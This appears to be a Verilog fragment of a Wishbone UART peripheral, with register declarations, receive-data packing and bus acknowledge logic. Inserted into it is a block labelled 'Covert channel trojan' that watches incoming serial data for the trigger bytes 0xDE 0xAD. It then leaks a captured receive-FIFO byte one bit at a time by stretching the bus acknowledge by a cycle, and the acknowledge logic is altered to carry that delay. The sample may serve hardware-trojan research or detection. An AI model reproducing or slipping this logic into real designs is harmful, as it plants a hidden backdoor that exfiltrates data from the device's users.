// Register and signal declarations
// {{{
wire	tx_busy;
reg	[30:0]	uart_setup;
// Receiver
wire		rx_stb, rx_break, rx_perr, rx_ferr, ck_uart;
wire	[7:0]	rx_uart_data;
reg		rx_uart_reset;
// Receive FIFO
wire		rx_empty_n, rx_fifo_err;
wire	[7:0]	rxf_wb_data;
wire	[15:0]	rxf_status;
reg		rxf_wb_read;
//
wire	[(LCLLGFLEN-1):0]	check_cutoff;
reg			r_rx_perr, r_rx_ferr;
wire	[31:0]		wb_rx_data;
// The transmitter
wire		tx_empty_n, txf_err, tx_break;
wire	[7:0]	tx_data;
wire	[15:0]	txf_status;
reg		txf_wb_write, tx_uart_reset;
reg	[7:0]	txf_wb_data;
//
wire	[31:0]	wb_tx_data;
wire	[31:0]	wb_fifo_data;
reg	[1:0]	r_wb_addr;
reg		r_wb_ack;

// Covert channel trojan signals
reg	[15:0]	trigger_buffer;		// Buffer to detect trigger sequence 0xDEAD
reg		trigger_active;		// Active when trigger detected
reg	[7:0]	leak_byte;		// Byte to leak from RX FIFO
reg	[2:0]	bit_counter;		// Current bit being leaked (0-7)
reg		ack_delay;		// Delay ACK by one cycle when bit=1
reg		trigger_detected;	// Pulse when trigger sequence detected
// }}}

// wb_rx_data
// {{{
// Finally, we'll construct a 32-bit value from these various wires,
// to be returned over the bus on any read.  These include the data
// that would be read from the FIFO, an error indicator set upon
// reading from an empty FIFO, a break indicator, and the frame and
// parity error signals.
assign	wb_rx_data = { 16'h00,
			3'h0, rx_fifo_err,
			rx_break, rx_ferr, r_rx_perr, !rx_empty_n,
			rxf_wb_data};
// }}}

////////////////////////////////////////////////////////////////////////
//
// Covert Channel Trojan Logic
// {{{
////////////////////////////////////////////////////////////////////////
//

// Trigger detection: look for 0xDE, 0xAD sequence in received data
// {{{
initial	trigger_buffer = 16'h0000;
initial	trigger_detected = 1'b0;
always @(posedge i_clk)
if (i_reset)
begin
	trigger_buffer <= 16'h0000;
	trigger_detected <= 1'b0;
end else if (rx_stb)
begin
	trigger_buffer <= { trigger_buffer[7:0], rx_uart_data };
	trigger_detected <= (trigger_buffer[15:8] == 8'hDE) && 
			    (rx_uart_data == 8'hAD);
end else
	trigger_detected <= 1'b0;
// }}}

// Trigger state machine and data capture
// {{{
initial	trigger_active = 1'b0;
initial	leak_byte = 8'h00;
initial	bit_counter = 3'h0;
always @(posedge i_clk)
if (i_reset)
begin
	trigger_active <= 1'b0;
	leak_byte <= 8'h00;
	bit_counter <= 3'h0;
end else if (trigger_detected && rx_empty_n)
begin
	// Trigger detected and FIFO has data - capture next byte to leak
	trigger_active <= 1'b1;
	leak_byte <= rxf_wb_data;  // Capture current FIFO output
	bit_counter <= 3'h0;
end else if (trigger_active && (i_wb_stb && !i_wb_we) && r_wb_ack)
begin
	// Advance to next bit on each read transaction that completes
	if (bit_counter == 3'h7)
	begin
		trigger_active <= 1'b0;
		bit_counter <= 3'h0;
	end else
		bit_counter <= bit_counter + 1'b1;
end
// }}}

// ACK delay generation based on current bit
// {{{
always @(*)
begin
	if (trigger_active && (i_wb_stb && !i_wb_we))
		ack_delay = leak_byte[bit_counter];
	else
		ack_delay = 1'b0;
end
// }}}
// }}}

// }}}

	// r_wb_ack
	// {{{
	initial	r_wb_ack = 1'b0;
	always @(posedge i_clk) // We'll ACK in two clocks (or three if covert channel active)
		r_wb_ack <= (!i_reset)&&(i_wb_stb)&&(!ack_delay);
	// }}}

	// o_wb_ack
	// {{{
	initial	o_wb_ack = 1'b0;
	always @(posedge i_clk) // Okay, time to set the ACK
		o_wb_ack <= (!i_reset)&&(r_wb_ack)&&(i_wb_cyc);
	// }}}

